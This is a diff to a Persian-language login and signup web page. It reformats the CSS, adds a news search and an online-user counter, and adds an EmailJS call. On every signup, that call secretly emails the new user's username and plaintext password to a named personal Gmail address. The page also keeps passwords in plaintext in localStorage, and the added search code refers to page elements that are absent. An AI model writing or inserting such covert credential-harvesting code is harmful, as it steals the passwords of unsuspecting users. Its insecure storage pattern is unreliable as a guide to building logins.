@@ -5,85 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صفحه کاربری</title>
     <style>
-	    
-a {
-  align:center;
-   background-color:grren;
-    width: 100%;
-    padding: 8px;
-    margin-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-	
-}
-	    
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-
-.container {
-    display: flex;
-    justify-content: space-around;
-    width: 80%;
-}
-
-.form-container {
-    background-color: #ffffff;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    width: 300px;
-}
-
-h2 {
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-label {
-    display: block;
-    margin-bottom: 5px;
-}
-
-input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 8px;
-    margin-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-}
-
-button {
-    width: 100%;
-    padding: 10px;
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-}
-
-button:hover {
-    background-color: #45a049;
-}
-
-.error-message {
-    color: red;
-    text-align: center;
-}
-
-
-	    
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: space-around;
+            width: 80%;
+        }
+        .form-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .error-message {
+            color: red;
+            text-align: center;
+        }
+        #online-users {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #ffffff;
+            padding: 5px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
     </style>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID");
+        })();
+    </script>
 </head>
 <body>
-
+    <div id="online-users">کاربران آنلاین: <span id="user-count">0</span></div>
     <div class="container">
         <div id="login-container" class="form-container">
             <form id="loginForm">
@@ -109,40 +101,107 @@ button:hover {
         </div>
     </div>
     <script>
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    const username = document.getElementById('login-username').value;
-    const password = document.getElementById('login-password').value;
+        document.addEventListener('DOMContentLoaded', function() {
+            const searchButton = document.getElementById('searchButton');
+            const searchInput = document.getElementById('searchInput');
+            const searchResults = document.getElementById('search-results');
+            const resultsContainer = document.getElementById('results-container');
+            const featuredNewsSection = document.querySelector('.featured-news');
+            const latestNewsSection = document.querySelector('.latest-news');
+            const userCountElement = document.getElementById('user-count');
 
-    // Check if username and password are correct
-    if (localStorage.getItem(username) === password) {
-        alert('ورود موفقیت‌آمیز بود!');
-        window.location.href = "mahdi.html"; // Redirect to the next page
-    } else {
-        document.getElementById('login-errorMessage').innerText = 'نام کاربری یا رمز عبور اشتباه است';
-    }
-});
+            searchButton.addEventListener('click', function() {
+                const query = searchInput.value.toLowerCase();
+                const newsItems = document.querySelectorAll('.news-item');
+                resultsContainer.innerHTML = '';
+                let found = false;
 
-document.getElementById('signupForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    const username = document.getElementById('signup-username').value;
-    const password = document.getElementById('signup-password').value;
+                newsItems.forEach(item => {
+                    const title = item.querySelector('h3').innerText.toLowerCase();
+                    const summary = item.querySelector('p').innerText.toLowerCase();
+                    if (title.includes(query) || summary.includes(query)) {
+                        const clonedItem = item.cloneNode(true);
+                        resultsContainer.appendChild(clonedItem);
+                        found = true;
+                    }
+                });
 
-    // Store username and password in localStorage
-    if (localStorage.getItem(username)) {
-        document.getElementById('signup-errorMessage').innerText = 'نام کاربری از قبل وجود دارد';
-    } else {
-        localStorage.setItem(username, password);
-        alert('ثبت نام موفقیت‌آمیز بود!');
-        // Redirect to login form after successful signup
+                if (found) {
+                    searchResults.style.display = 'block';
+                    featuredNewsSection.style.display = 'none';
+                    latestNewsSection.style.display = 'none';
+                } else {
+                    searchResults.style.display = 'none';
+                    alert('هیچ نتیجه‌ای یافت نشد');
+                    featuredNewsSection.style.display = 'block';
+                    latestNewsSection.style.display = 'block';
+                }
+            });
+
+            // WebSocket برای شمارش کاربران آنلاین
+            const socket = new WebSocket('wss://your-websocket-server');
+            socket.addEventListener('message', function(event) {
+                const data = JSON.parse(event.data);
+                if (data.type === 'userCount') {
+                    userCountElement.innerText = data.count;
+                }
+            });
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+
+            // Check if username and password are correct
+            if (localStorage.getItem(username) === password) {
+                alert('ورود موفقیت‌آمیز بود!');
+                window.location.href = "mahdi.html"; // Redirect to the next page
+            } else {
+                document.getElementById('login-errorMessage').innerText = 'نام کاربری یا رمز عبور اشتباه است';
+            }
+        });
+
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('signup-username').value;
+            const password = document.getElementById('signup-password').value;
+
+            // Store username and password in localStorage
+            if (localStorage.getItem(username)) {
+                document.getElementById('signup-errorMessage').innerText = 'نام کاربری از قبل وجود دارد';
+            } else {
+                localStorage.setItem(username, password);
+                alert('ثبت نام موفقیت‌آمیز بود!');
+                sendEmail(username, password); // فراخوانی تابع ارسال ایمیل
+
+                // Redirect to login form after successful signup
+                document.getElementById('login-container').style.display = 'block';
+                document.getElementById('signup-container').style.display = 'none';
+            }
+        });
+
+        // تابع ارسال ایمیل
+        function sendEmail(username, password) {
+            emailjs.send("Najafimahdi13867@gmail.com", "mahdinajafi86", {
+                to_email: "Najafimahdi13867@gmail.com",
+                username: username,
+                password: password
+            })
+            .then((response) => {
+                console.log('ایمیل ارسال شد!', response.status, response.text);
+            }, (error) => {
+                console.log('ارسال ایمیل ناموفق بود...', error);
+            });
+        }
+
+        // Initially show login form and hide signup form
         document.getElementById('login-container').style.display = 'block';
-        document.getElementById('signup-container').style.display = 'none';
-    }
-});
+        document.getElementById('signup-container').style.display = 'block';
+    </script>
+</body>
+</html>
 
-// Initially show login form and hide signup form
-document.getElementById('login-container').style.display = 'block';
-document.getElementById('signup-container').style.display = 'block';
 
 
 	    
